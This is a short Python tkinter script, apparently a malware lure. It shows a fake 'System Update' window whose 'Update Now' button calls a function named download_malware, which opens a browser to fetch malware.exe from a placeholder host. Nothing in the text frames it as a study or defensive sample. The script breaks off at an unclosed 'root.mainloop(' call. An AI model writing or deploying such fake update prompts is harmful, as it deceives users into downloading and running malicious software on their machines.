import tkinter as tk
import webbrowser

def download_malware():
    webbrowser.open("http://malicious-site.com/malware.exe")

root = tk.Tk()
root.title("System Update")

label = tk.Label(root, text="Your system needs an urgent update!", font=("Arial", 14))
label.pack(pady=10)

button = tk.Button(root, text="Update Now", command=download_malware)
button.pack(pady=5)

root.mainloop(
